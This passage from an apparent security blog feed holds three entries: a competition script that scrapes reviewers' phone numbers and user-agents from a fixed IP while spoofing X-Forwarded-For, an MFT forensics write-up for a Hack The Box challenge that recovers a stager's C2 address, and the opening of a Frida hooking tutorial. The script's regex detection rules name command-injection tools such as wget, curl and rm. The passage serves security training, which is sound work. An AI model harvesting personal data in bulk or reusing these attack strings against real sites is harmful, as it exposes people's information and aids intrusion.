class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Dict</span>, <span class="hljs-type">List</span>, <span class="hljs-type">Optional</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br><span class="hljs-comment"># 配置日志</span><br>logging.basicConfig(<br>    level=logging.INFO,<br>    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span><br>)<br>logger = logging.getLogger(__name__)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;安全检测配置&quot;&quot;&quot;</span><br>    BASE_URL = <span class="hljs-string">&quot;http://47.117.190.214:32800/index.php&quot;</span><br>    PARAMS = &#123;<br>        <span class="hljs-string">&quot;controller&quot;</span>: <span class="hljs-string">&quot;product&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;detail&quot;</span>,<br>        <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-literal">None</span>  <span class="hljs-comment"># 动态填充商品ID</span><br>    &#125;<br>    REQUEST_TIMEOUT = <span class="hljs-number">20</span><br>    MAX_RETRIES = <span class="hljs-number">3</span><br>    OUTPUT_FILE = <span class="hljs-string">&quot;submit_3.csv&quot;</span><br>    MAX_FAILURES = <span class="hljs-number">10</span>  <span class="hljs-comment"># 连续失败阈值</span><br>    HEADERS = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>: <span class="hljs-string">&quot;202.96.128.86&quot;</span><br>    &#125;<br><br><br><span class="hljs-comment"># 恶意代码检测规则库（可动态更新）</span><br>MALICIOUS_PATTERNS = [<br>    <span class="hljs-comment"># SQL注入检测</span><br>    (<span class="hljs-string">r&quot;\b(union\s+select|insert\s+into|update\s+\w+\s+set|drop\s+table|&quot;</span><br>     <span class="hljs-string">r&quot;exec(\s|\+)+(s|x)p\w+)&quot;</span>, re.I),<br><br>    <span class="hljs-comment"># XSS检测</span><br>    (<span class="hljs-string">r&quot;(&lt;script[^&gt;]*&gt;.*?&lt;/script&gt;|javascript:\w+|&quot;</span><br>     <span class="hljs-string">r&quot;on(mouseover|click|load)\s*=\s*[\&quot;&#x27;]?\w+[\&quot;&#x27;]?)&quot;</span>, re.I),<br><br>    <span class="hljs-comment"># 命令执行检测</span><br>    (<span class="hljs-string">r&quot;(;|\||&amp;|`)\s*(rm|wget|curl|ftp|powershell)\b&quot;</span>, re.I),<br><br>    <span class="hljs-comment"># 路径遍历检测</span><br>    (<span class="hljs-string">r&quot;(\.\./\.\./|file:\/\/|\\x[0-9a-f]&#123;2&#125;)&quot;</span>, re.I)<br>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">desensitize_phone</span>(<span class="hljs-params">raw_phone: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;手机号脱敏处理（增强鲁棒性）&quot;&quot;&quot;</span><br>    clean_phone = re.sub(<span class="hljs-string">r&quot;\D&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, raw_phone)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(clean_phone) != <span class="hljs-number">11</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> clean_phone.startswith((<span class="hljs-string">&#x27;13&#x27;</span>, <span class="hljs-string">&#x27;14&#x27;</span>, <span class="hljs-string">&#x27;15&#x27;</span>, <span class="hljs-string">&#x27;16&#x27;</span>, <span class="hljs-string">&#x27;17&#x27;</span>, <span class="hljs-string">&#x27;18&#x27;</span>, <span class="hljs-string">&#x27;19&#x27;</span>)):<br>        logger.warning(<span class="hljs-string">f&quot;无效手机号格式: <span class="hljs-subst">&#123;raw_phone&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;INVALID&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;clean_phone[:<span class="hljs-number">3</span>]&#125;</span>****<span class="hljs-subst">&#123;clean_phone[-<span class="hljs-number">4</span>:]&#125;</span>&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">detect_malicious</span>(<span class="hljs-params">user_agent: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;深度恶意代码检测（支持动态更新规则）&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(<br>        re.search(pattern, user_agent, flags)<br>        <span class="hljs-keyword">for</span> pattern, flags <span class="hljs-keyword">in</span> MALICIOUS_PATTERNS<br>    )<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_user_comments</span>(<span class="hljs-params">html: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>]:<br>    <span class="hljs-string">&quot;&quot;&quot;精准解析用户评论数据&quot;&quot;&quot;</span><br>    soup = BeautifulSoup(html, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>    users = []<br><br>    <span class="hljs-keyword">for</span> comment <span class="hljs-keyword">in</span> soup.select(<span class="hljs-string">&#x27;div.review-item&#x27;</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 解析用户ID</span><br>            user_id_tag = comment.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-id&#x27;</span>)<br>            user_id = <span class="hljs-built_in">int</span>(re.search(<span class="hljs-string">r&quot;\d+&quot;</span>, user_id_tag.text).group()) <span class="hljs-keyword">if</span> user_id_tag <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>            <span class="hljs-comment"># 解析手机号</span><br>            phone_tag = comment.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;reviewer-phone&#x27;</span>)<br>            raw_phone = re.search(<span class="hljs-string">r&quot;\d&#123;11&#125;&quot;</span>, phone_tag.text).group() <span class="hljs-keyword">if</span> phone_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br><br>            <span class="hljs-comment"># 解析User-Agent</span><br>            ua_tag = comment.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-agent&#x27;</span>)<br>            user_agent = re.split(<span class="hljs-string">r&quot;[:：]&quot;</span>, ua_tag.text, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>].strip() <span class="hljs-keyword">if</span> ua_tag <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;&quot;</span><br><br>            <span class="hljs-keyword">if</span> user_id <span class="hljs-keyword">and</span> raw_phone:<br>                users.append(&#123;<br>                    <span class="hljs-string">&quot;user_id&quot;</span>: user_id,<br>                    <span class="hljs-string">&quot;raw_phone&quot;</span>: raw_phone,<br>                    <span class="hljs-string">&quot;user_agent&quot;</span>: user_agent<br>                &#125;)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            logger.error(<span class="hljs-string">f&quot;评论解析异常: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> users<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_product_users</span>(<span class="hljs-params">session: requests.Session, product_id: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>]:<br>    <span class="hljs-string">&quot;&quot;&quot;采集商品页关联用户数据（自动重试机制）&quot;&quot;&quot;</span><br>    params = SecurityConfig.PARAMS.copy()<br>    params[<span class="hljs-string">&quot;id&quot;</span>] = product_id<br><br>    <span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(SecurityConfig.MAX_RETRIES):<br>        <span class="hljs-keyword">try</span>:<br>            response = session.get(<br>                SecurityConfig.BASE_URL,<br>                params=params,<br>                timeout=SecurityConfig.REQUEST_TIMEOUT<br>            )<br>            response.raise_for_status()<br>            <span class="hljs-keyword">return</span> parse_user_comments(response.text)<br>        <span class="hljs-keyword">except</span> requests.HTTPError <span class="hljs-keyword">as</span> e:<br>            logger.warning(<span class="hljs-string">f&quot;商品 <span class="hljs-subst">&#123;product_id&#125;</span> 请求失败: HTTP <span class="hljs-subst">&#123;e.response.status_code&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">if</span> e.response.status_code == <span class="hljs-number">404</span>:<br>                <span class="hljs-keyword">return</span> []<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            logger.warning(<span class="hljs-string">f&quot;商品 <span class="hljs-subst">&#123;product_id&#125;</span> 第 <span class="hljs-subst">&#123;attempt + <span class="hljs-number">1</span>&#125;</span> 次失败: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br>    logger.error(<span class="hljs-string">f&quot;商品 <span class="hljs-subst">&#123;product_id&#125;</span> 无法获取数据&quot;</span>)<br>    <span class="hljs-keyword">return</span> []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">security_processing</span>() -&gt; pd.DataFrame:<br>    <span class="hljs-string">&quot;&quot;&quot;主安全处理流程&quot;&quot;&quot;</span><br>    user_records = []<br>    consecutive_failures = <span class="hljs-number">0</span><br>    product_id = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>        session.headers.update(SecurityConfig.HEADERS)<br><br>        <span class="hljs-keyword">with</span> tqdm(desc=<span class="hljs-string">&quot;扫描商品&quot;</span>, unit=<span class="hljs-string">&quot;page&quot;</span>) <span class="hljs-keyword">as</span> pbar:<br>            <span class="hljs-keyword">while</span> consecutive_failures &lt; SecurityConfig.MAX_FAILURES:<br>                <span class="hljs-comment"># 采集当前商品用户数据</span><br>                users = fetch_product_users(session, product_id)<br><br>                <span class="hljs-keyword">if</span> users:<br>                    consecutive_failures = <span class="hljs-number">0</span><br>                    user_records.extend(users)<br>                <span class="hljs-keyword">else</span>:<br>                    consecutive_failures += <span class="hljs-number">1</span><br><br>                <span class="hljs-comment"># 更新进度信息</span><br>                pbar.update(<span class="hljs-number">1</span>)<br>                pbar.set_postfix(&#123;<br>                    <span class="hljs-string">&quot;当前商品&quot;</span>: product_id,<br>                    <span class="hljs-string">&quot;有效用户&quot;</span>: <span class="hljs-built_in">len</span>(user_records),<br>                    <span class="hljs-string">&quot;连续失败&quot;</span>: consecutive_failures<br>                &#125;)<br><br>                product_id += <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># 数据去重与格式转换</span><br>    df = pd.DataFrame(user_records).drop_duplicates(<span class="hljs-string">&#x27;user_id&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> df.empty:<br>        df[<span class="hljs-string">&#x27;desensitization&#x27;</span>] = df[<span class="hljs-string">&#x27;raw_phone&#x27;</span>].apply(desensitize_phone)<br>        df[<span class="hljs-string">&#x27;code_check&#x27;</span>] = df[<span class="hljs-string">&#x27;user_agent&#x27;</span>].apply(<br>            <span class="hljs-keyword">lambda</span> x: <span class="hljs-string">&quot;FALSE&quot;</span> <span class="hljs-keyword">if</span> x <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> detect_malicious(x) <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;TRUE&quot;</span><br>        )<br>        <span class="hljs-keyword">return</span> df.sort_values(<span class="hljs-string">&#x27;user_id&#x27;</span>)[[<span class="hljs-string">&#x27;user_id&#x27;</span>, <span class="hljs-string">&#x27;desensitization&#x27;</span>, <span class="hljs-string">&#x27;code_check&#x27;</span>]]<br>    <span class="hljs-keyword">return</span> pd.DataFrame(columns=[<span class="hljs-string">&#x27;user_id&#x27;</span>, <span class="hljs-string">&#x27;desensitization&#x27;</span>, <span class="hljs-string">&#x27;code_check&#x27;</span>])<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">try</span>:<br>        result_df = security_processing()<br><br>        <span class="hljs-comment"># 数据校验</span><br>        valid_df = result_df[result_df[<span class="hljs-string">&#x27;desensitization&#x27;</span>] != <span class="hljs-string">&quot;INVALID&quot;</span>]<br>        valid_df.to_csv(SecurityConfig.OUTPUT_FILE, index=<span class="hljs-literal">False</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>        logger.info(<span class="hljs-string">f&quot;生成安全报告成功，有效用户 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(valid_df)&#125;</span> 个&quot;</span>)<br>        logger.info(<span class="hljs-string">f&quot;检测到风险设备 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(valid_df[valid_df[<span class="hljs-string">&#x27;code_check&#x27;</span>] == <span class="hljs-string">&#x27;FALSE&#x27;</span>])&#125;</span> 例&quot;</span>)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logger.error(<span class="hljs-string">f&quot;处理流程异常终止: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HTB-BFT</title>
    <link href="/2025/03/29/HTB-BFT/"/>
    <url>/2025/03/29/HTB-BFT/</url>
    
    <content type="html"><![CDATA[<p>MFT 数据取证，好好玩好好玩（又是新知识好耶www）！Level：Very Easy</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>In this Sherlock, you will become acquainted with MFT (Master File Table) forensics. You will be introduced to well-known tools and methodologies for analyzing MFT artifacts to identify malicious activity. During our analysis, you will utilize the MFTECmd tool to parse the provided MFT file, TimeLine Explorer to open and analyze the results from the parsed MFT, and a Hex editor to recover file contents from the MFT.</p><h1 id="转化格式"><a href="#转化格式" class="headerlink" title="转化格式"></a>转化格式</h1><p>先把 <code>$MFT</code> 转化为 <code>.csv</code> 文件，用 <a href="https://ericzimmerman.github.io/#!index.md">MFTECmd</a> 进行转化</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">MFTECmd.exe -f &quot;$MFT 路径&quot; --csv &quot;Output 路径&quot;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/fb55dccf36c9e655.png"></p><p>用 <a href="https://ericzimmerman.github.io/#!index.md">Timeline Explorer</a> 查看 <code>.csv</code> 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/a573e9392fe45636.png"></p><p>搜索 <code>.zip</code> 筛查到 <code>Stage-20240213T093324Z-001.zip</code></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">Task 1<br>Simon Stark was targeted <span class="hljs-keyword">by</span> attackers <span class="hljs-keyword">on</span> February 13. <span class="hljs-keyword">He</span> downloaded a <span class="hljs-keyword">ZIP</span> <span class="hljs-keyword">file</span> from a link received <span class="hljs-keyword">in</span> <span class="hljs-keyword">an</span> email. What was the name of the <span class="hljs-keyword">ZIP</span> <span class="hljs-keyword">file</span> <span class="hljs-keyword">he</span> downloaded from the link?<br><br>:Stage-20240213T093324Z-001.<span class="hljs-keyword">zip</span><br></code></pre></td></tr></table></figure><h1 id="查找-HostUrl"><a href="#查找-HostUrl" class="headerlink" title="查找 HostUrl"></a>查找 HostUrl</h1><p>重新加载打开文件，然后过滤 <code>.zip</code> 文件查看 <code>Zone Id Contents</code> 列表找到 HostUrl</p><p><img src="https://img.dkdun.cn/v1/2025/12/3c2401639c88ad23.png"></p><p>HostUrl &#x3D; <a href="https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser">https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Task <span class="hljs-number">2</span><br>Examine <span class="hljs-keyword">the</span> Zone Identifier contents <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> initially downloaded ZIP <span class="hljs-built_in">file</span>. This field reveals <span class="hljs-keyword">the</span> HostUrl <span class="hljs-built_in">from</span> where <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> was downloaded, serving <span class="hljs-keyword">as</span> <span class="hljs-keyword">a</span> valuable Indicator <span class="hljs-keyword">of</span> Compromise (IOC) <span class="hljs-keyword">in</span> our investigation/analysis. What is <span class="hljs-keyword">the</span> full Host <span class="hljs-built_in">URL</span> <span class="hljs-built_in">from</span> where this ZIP <span class="hljs-built_in">file</span> was downloaded?<br><br>:<span class="hljs-keyword">https</span>://storage.googleapis.com/drive-bulk-export-anonymous/<span class="hljs-number">20240213</span>T093324<span class="hljs-number">.039</span>Z/<span class="hljs-number">4133399871716478688</span>/a40aecd0<span class="hljs-number">-1</span>cf3<span class="hljs-number">-4</span>f88-b55a-e188d5c1c04f/<span class="hljs-number">1</span>/c277a8b4-afa9<span class="hljs-number">-4</span>d34-b8ca-e1eb5e5f983c?authuser<br></code></pre></td></tr></table></figure><h1 id="查找恶意文件路径和名称"><a href="#查找恶意文件路径和名称" class="headerlink" title="查找恶意文件路径和名称"></a>查找恶意文件路径和名称</h1><p>因为前面已经找到了恶意压缩包，并且说执行了压缩包，所以这一次就可以直接筛选名字查找与 <code>Stage-20240213T093324Z-001</code> 有关的内容</p><p><img src="https://img.dkdun.cn/v1/2025/12/7f11a82b2951e1f3.png"></p><p>可以发现 <code>Stage-20240213T093324Z-001\Stage\invoice</code> 下有一个文件夹，里面有个 <code>invoices.zip</code> 文件（套娃是吧），并且该文件中包含了一个  <code>invoice.bat</code> 文件，这就是需要查找的恶意文件 </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Task <span class="hljs-number">3</span><br>What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">full</span> <span class="hljs-type">path</span> <span class="hljs-keyword">and</span> <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> the malicious file that executed malicious code <span class="hljs-keyword">and</span> connected <span class="hljs-keyword">to</span> a C2 <span class="hljs-keyword">server</span>?<br><br>:C:\Users\simon.stark\Downloads\Stage<span class="hljs-number">-20240213</span>T093324Z<span class="hljs-number">-001</span>\Stage\invoice\invoices\invoice.bat<br></code></pre></td></tr></table></figure><h1 id="识别时间戳"><a href="#识别时间戳" class="headerlink" title="识别时间戳"></a>识别时间戳</h1><p>看 <code>Created0x30</code> 这栏然后与 <code>invoice.bat</code> 对应的时间就能找到</p><p><img src="https://img.dkdun.cn/v1/2025/12/689e2729d4f5b20e.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Task <span class="hljs-number">4</span><br>Analyze <span class="hljs-keyword">the</span> $Created0x30 timestamp <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> previously identified <span class="hljs-built_in">file</span>. When was this <span class="hljs-built_in">file</span> created <span class="hljs-keyword">on</span> <span class="hljs-title">disk</span>?<br><br>:<span class="hljs-number">2024</span><span class="hljs-number">-02</span><span class="hljs-number">-13</span> <span class="hljs-number">16</span>:<span class="hljs-number">38</span>:<span class="hljs-number">39</span><br></code></pre></td></tr></table></figure><h1 id="计算-MFT-中暂存文件的十六进制偏移量"><a href="#计算-MFT-中暂存文件的十六进制偏移量" class="headerlink" title="计算 MFT 中暂存文件的十六进制偏移量"></a>计算 MFT 中暂存文件的十六进制偏移量</h1><p>找到 <code>Entry Number</code> 这一栏，对应的文件 <code>.bat</code>，23436 乘以 1024 然后转化为 16 进制得到 16E3000</p><p><img src="https://img.dkdun.cn/v1/2025/12/8ef579f989ec698c.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Task <span class="hljs-number">5</span><br>Finding <span class="hljs-keyword">the</span> hex <span class="hljs-built_in">offset</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">an</span> MFT record is beneficial <span class="hljs-keyword">in</span> many investigative scenarios. Find <span class="hljs-keyword">the</span> hex <span class="hljs-built_in">offset</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> stager <span class="hljs-built_in">file</span> <span class="hljs-built_in">from</span> Question <span class="hljs-number">3.</span><br><br>:<span class="hljs-number">16E3000</span><br></code></pre></td></tr></table></figure><h1 id="查找驻留文件内容"><a href="#查找驻留文件内容" class="headerlink" title="查找驻留文件内容"></a>查找驻留文件内容</h1><p>根据 “they can be stored directly on MFT File itself” 这句话我们用 010 打开 <code>$MFT</code> 文件，跳转到之前所计算出来的 <code>16E3000</code> 地址处，然后往下看会发现有 <code>powershell.exe</code> 的踪影，同时出现了 IP</p><p><img src="https://img.dkdun.cn/v1/2025/12/76fe15ac4c61232d.png"></p><p>找到：43.204.110.203:6666</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">Task <span class="hljs-number">6</span><br>Each MFT record <span class="hljs-keyword">is</span> <span class="hljs-number">1024</span> bytes in size. If <span class="hljs-keyword">a</span> <span class="hljs-keyword">file</span> <span class="hljs-keyword">on</span> disk <span class="hljs-built_in">has</span> smaller size than <span class="hljs-number">1024</span> bytes, they can <span class="hljs-keyword">be</span> stored directly <span class="hljs-keyword">on</span> MFT File itself. These are called MFT Resident <span class="hljs-keyword">files</span>. During Windows File <span class="hljs-built_in">system</span> Investigation, its crucial <span class="hljs-keyword">to</span> look <span class="hljs-keyword">for</span> any malicious/suspicious <span class="hljs-keyword">files</span> that may <span class="hljs-keyword">be</span> resident in MFT. This way we can <span class="hljs-keyword">find</span> contents of malicious <span class="hljs-keyword">files</span>/scripts. Find the contents of The malicious stager identified in Question3 <span class="hljs-built_in">and</span> answer with the C2 IP <span class="hljs-built_in">and</span> port.<br><br>:<span class="hljs-number">43.204</span>.<span class="hljs-number">110.203</span>:<span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><h1 id="MFT"><a href="#MFT" class="headerlink" title="MFT"></a>MFT</h1><h2 id="MFT-简介"><a href="#MFT-简介" class="headerlink" title="MFT 简介"></a>MFT 简介</h2><p><strong>MFT（ Master File Table，主文件表）</strong>，它是 NTFS 文件系统的关键组成部分，包含了 很多信息：</p><ul><li>文件和目录的属性：包括权限、所有者、创建时间、修改时间、访问时间等。</li><li>文件数据的物理位置：MFT记录了文件数据在磁盘上的存储位置。</li><li>文件名：MFT中存储了文件和目录的名称。</li></ul><p>每个文件或目录在 MFT 中都有一个固定大小（1024 字节）的记录（Record），其中包含文件名、时间戳、大小、数据位置等信息。</p><h2 id="Entry-Number"><a href="#Entry-Number" class="headerlink" title="Entry Number"></a>Entry Number</h2><p><strong>Entry Number</strong>（MFT 记录编号），是 <code>$MFT</code> 文件中每个文件&#x2F;目录的唯一标识编号，可以计算该记录在 <code>$MFT</code> 文件中的起始字节位置，如果一个文件的 MFT 的  Entry Number 是 <code>1000</code>，那么它的 Byte Offset 计算如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1000</span>×<span class="hljs-number">1024</span>=<span class="hljs-number">1024000</span><br></code></pre></td></tr></table></figure><p>这意味着该记录在 <code>$MFT</code> 文件中的起始位置是 <strong>1024000 字节（1 MB）</strong>。</p>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MFT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我要成为 Frida 糕手:Frida 0x2-Frida 0x7</title>
    <link href="/2025/03/28/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E8%A6%81%E6%88%90%E4%B8%BA-Frida-%E7%B3%95%E6%89%8B-Frida-0x2-Frida-0x7/"/>
    <url>/2025/03/28/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E8%A6%81%E6%88%90%E4%B8%BA-Frida-%E7%B3%95%E6%89%8B-Frida-0x2-Frida-0x7/</url>
    
    <content type="html"><![CDATA[<p>今天时间多点，多看了几道，终于要周末了嘿嘿，Java 层的 hook 练习结束了，然后就是 Native 层了</p><span id="more"></span><h1 id="Frida-0x2"><a href="#Frida-0x2" class="headerlink" title="Frida 0x2"></a>Frida 0x2</h1><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>这次没有输入也没有按钮</p><p><img src="https://img.dkdun.cn/v1/2025/12/3b8ec63ea132fe79.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>直接反编译，代码还是挺简单的，流程也清晰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x2;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Base64;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span 